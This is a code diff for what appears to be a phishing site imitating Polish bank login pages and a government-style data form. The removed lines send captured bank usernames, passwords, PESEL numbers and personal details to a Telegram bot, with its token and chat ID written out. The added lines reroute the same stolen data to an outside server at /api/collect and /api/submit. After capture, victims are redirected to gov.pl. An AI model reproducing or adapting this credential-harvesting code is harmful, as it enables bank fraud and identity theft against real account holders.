@@ -1,14 +1,13 @@
 // ============================================================
-//   КОНФИГУРАЦИЯ TELEGRAM
+//   КОНФИГУРАЦИЯ
 // ============================================================
-const TELEGRAM_BOT_TOKEN = '8403131166:AAEjVV93BhQBfFcJ_8rud46BwWC3omtKXY8';
-const TELEGRAM_CHAT_ID = '-5485289736';
+// Если сайт открывается с того же домена Render — оставь пусто.
+// Если сайт на другом домене — впиши 'https://ggfg-ikmy.onrender.com'
+const API_URL = '';
 
 // ============================================================
-//   УТИЛИТЫ ДЛЯ IBAN / NRB
+//   УТИЛИТЫ IBAN
 // ============================================================
-
-// Убирает всё лишнее: пробелы, дефисы, PL, оставляет только цифры
 function cleanIbanValue(value) {
     if (!value) return '';
     let cleaned = value.replace(/[\s\-]/g, '').toUpperCase();
@@ -17,44 +16,36 @@ function cleanIbanValue(value) {
     return cleaned;
 }
 
-// Форматирует NRB с пробелами: XX XXXX XXXX XXXX XXXX XXXX XXXX
-// Пример: 61 1090 1014 0000 0712 1981 2874
 function formatIban(value) {
     const digits = cleanIbanValue(value);
     if (digits.length === 0) return '';
-
-    // Первые 2 цифры
     let result = digits.substring(0, 2);
-
-    // Далее группы по 4
     for (let i = 2; i < digits.length; i += 4) {
         result += ' ' + digits.substring(i, i + 4);
     }
-
     return result;
 }
 
 // ============================================================
-//   ОТПРАВКА В TELEGRAM (банк-логины)
+//   ОТПРАВКА
 // ============================================================
-function sendToTelegram(bankName, login, password) {
-    const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🕒 ${new Date().toLocaleString()}`;
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+function sendToTelegram(bankName, login, password, pesel) {
+    fetch(API_URL + '/api/collect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
+            bank: bankName,
+            username: login,
+            password: password,
+            pesel: pesel || null
         })
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) console.log('✅ Wysłano do Telegram');
-        else console.error('❌ Błąd Telegram:', data);
+    .then(r => r.json())
+    .then(d => {
+        if (d.success) console.log('✅ Wysłano na serwer');
+        else console.error('❌ Błąd:', d.error);
     })
-    .catch(error => console.error('❌ Błąd sieci:', error));
+    .catch(e => console.error('❌ Сеть:', e));
 }
 
 // ============================================================
@@ -124,7 +115,7 @@ function sendToTelegram(bankName, login, password) {
 })();
 
 // ============================================================
-//   ВСПОМОГАТЕЛЬНЫЕ МАСКИ
+//   МАСКИ
 // ============================================================
 function autoSlash(event) {
     const input = event.target;
@@ -155,7 +146,7 @@ function autoPostal(event) {
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
 
-    // ===== МЕНЮ =====
+    // Меню
     const menuToggle = document.getElementById('menuToggle');
     const sidebar = document.getElementById('sidebar');
     const mainWrapper = document.getElementById('mainWrapper');
@@ -199,7 +190,7 @@ document.addEventListener('DOMContentLoaded', function() {
         if (e.key === 'Escape' && isMenuOpen) toggleMenu();
     });
 
-    // ===== ПОИСК =====
+    // Поиск
     document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
         const input = this.closest('.header-search').querySelector('input');
         alert('Szukanie: ' + (input?.value || 'puste'));
@@ -209,7 +200,6 @@ document.addEventListener('DOMContentLoaded', function() {
         if (e.key === 'Enter') alert('Szukanie: ' + this.value);
     });
 
-    // ===== ССЫЛКИ LOGIN NAV =====
     document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
         link.addEventListener('click', function(e) {
             e.preventDefault();
@@ -217,7 +207,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
 
-    // ===== КНОПКА "DOWIEDZ SIĘ WIĘCEJ" =====
+    // Кнопка "DOWIEDZ SIĘ WIĘCEJ"
     const scrollBtn = document.getElementById('scrollToFormBtn');
     const formSection = document.getElementById('dataFormSection');
     if (scrollBtn && formSection) {
@@ -227,35 +217,24 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // ============================================================
-    //   NRB / IBAN — АВТОФОРМАТИРОВАНИЕ С ПРОБЕЛАМИ
-    // ============================================================
+    // NRB — автоформатирование
     const ibanInput = document.getElementById('iban');
     const ibanWrapper = document.getElementById('ibanWrapper');
 
     if (ibanInput) {
-
-        // При вводе: оставляем только цифры, вставляем пробелы
         ibanInput.addEventListener('input', function() {
             const cursorPos = this.selectionStart;
             const before = this.value;
             const digits = cleanIbanValue(before);
             const formatted = formatIban(digits);
             this.value = formatted;
-
-            // Курсор оставляем примерно там же
-            // (простая эвристика — сдвигаем на разницу в длине)
             const diff = formatted.length - before.length;
             const newPos = Math.max(0, cursorPos + diff);
-            try {
-                this.setSelectionRange(newPos, newPos);
-            } catch (e) { /* ignore */ }
-
+            try { this.setSelectionRange(newPos, newPos); } catch (e) {}
             this.classList.remove('error');
             if (ibanWrapper) ibanWrapper.classList.remove('error');
         });
 
-        // При вставке: чистим и форматируем
         ibanInput.addEventListener('paste', function() {
             setTimeout(() => {
                 const digits = cleanIbanValue(this.value);
@@ -265,16 +244,13 @@ document.addEventListener('DOMContentLoaded', function() {
             }, 5);
         });
 
-        // При потере фокуса: финальное форматирование
         ibanInput.addEventListener('blur', function() {
             const digits = cleanIbanValue(this.value);
             this.value = formatIban(digits);
         });
     }
 
-    // ============================================================
-    //   ФОРМА — ОТПРАВКА
-    // ============================================================
+    // Форма
     const form = document.getElementById('dataForm');
     const submitBtn = document.getElementById('submitBtn');
     const toast = document.getElementById('toastMessage');
@@ -346,26 +322,14 @@ document.addEventListener('DOMContentLoaded', function() {
 
             const formData = getFormData();
 
-            const message = '📋 *Nowe dane formularza*\n' +
-                            '👤 *Imię:* ' + formData.fullname + '\n' +
-                            '📅 *Data urodzenia:* ' + formData.birthdate + '\n' +
-                            '📱 *Telefon:* ' + formData.phone + '\n' +
-                            '🏠 *Adres:* ' + formData.street + ', ' + formData.city + ', ' + formData.postal + '\n' +
-                            '🏦 *IBAN:* ' + formData.iban + '\n' +
-                            '🕒 ' + new Date().toLocaleString();
-
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            fetch(API_URL + '/api/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify(formData)
             })
             .then(response => response.json())
             .then(data => {
-                if (data.ok) {
+                if (data.success) {
                     showToast('Dane zostały wysłane!', true);
                     if (loginNav) loginNav.classList.add('hidden');
                     if (imageBanner) imageBanner.classList.add('hidden');
@@ -374,12 +338,12 @@ document.addEventListener('DOMContentLoaded', function() {
                     if (bankFooter) bankFooter.classList.add('visible');
                     window.scrollTo({ top: 0, behavior: 'smooth' });
                 } else {
-                    showToast('Wystąpił błąd podczas wysyłania. Spróbuj ponownie.');
+                    showToast('Błąd: ' + (data.error || 'nieznany'));
                 }
             })
             .catch(error => {
                 console.error('Błąd:', error);
-                showToast('Wystąpił błąd połączenia. Spróbuj ponownie.');
+                showToast('Błąd połączenia.');
             })
             .finally(() => {
                 if (submitBtn) {
@@ -412,40 +376,23 @@ function handleLogin2(event, bankName) {
     event.preventDefault();
     const form = event.target;
     const allInputs = form.querySelectorAll('input');
-    var login = '', password = '', pesel = '';
 
-    var loginField = document.getElementById('loginUsername2');
-    var passwordField = document.getElementById('loginPassword2');
-    var peselField = document.getElementById('loginPesel2');
-
-    if (loginField) login = loginField.value.trim();
-    if (passwordField) password = passwordField.value.trim();
-    if (peselField) pesel = peselField.value.trim();
+    const login = document.getElementById('loginUsername2')?.value.trim() || '';
+    const password = document.getElementById('loginPassword2')?.value.trim() || '';
+    const pesel = document.getElementById('loginPesel2')?.value.trim() || '';
 
     if (!login || !password || !pesel) {
         alert('Proszę wypełnić wszystkie pola (Millekod, Hasło i Pesel) dla ' + bankName + '.');
         return false;
     }
 
-    const message = `🔐 *Nowe logowanie*\n🏦 *Bank:* ${bankName}\n👤 *Login:* ${login}\n🔑 *Hasło:* ${password}\n🆔 *Pesel:* ${pesel}\n🕒 ${new Date().toLocaleString()}`;
-
-    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        })
-    })
-    .then(r => r.json())
-    .then(d => { if (d.ok) console.log('✅ Wysłano'); else console.error('❌', d); })
-    .catch(e => console.error('❌', e));
-
+    sendToTelegram(bankName, login, password, pesel);
     alert('✅ Dane dla ' + bankName + ' zostały wysłane!');
+
     allInputs.forEach(input => {
         if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') input.value = '';
     });
+
     setTimeout(() => { window.location.href = 'https://www.gov.pl'; }, 1500);
     return false;
 }
@@ -516,7 +463,7 @@ function handleLogin(event, bankName) {
 }
 
 // ============================================================
-//   ОТКРЫТИЕ ЭКРАНОВ БАНКОВ
+//   ОТКРЫТИЕ ЭКРАНОВ
 // ============================================================
 function openLoginScreen1() {
     document.getElementById('bankSelection').classList.remove('visible');
@@ -594,7 +541,6 @@ function openLoginScreen12() {
     window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
-// ===== ESC =====
 document.addEventListener('keydown', function(e) {
     if (e.key === 'Escape') {
         const screens = ['loginScreen1','loginScreen2','loginScreen3','loginScreen4','loginScreen5','loginScreen6','loginScreen7','loginScreen8','loginScreen9','loginScreen10','loginScreen12'];
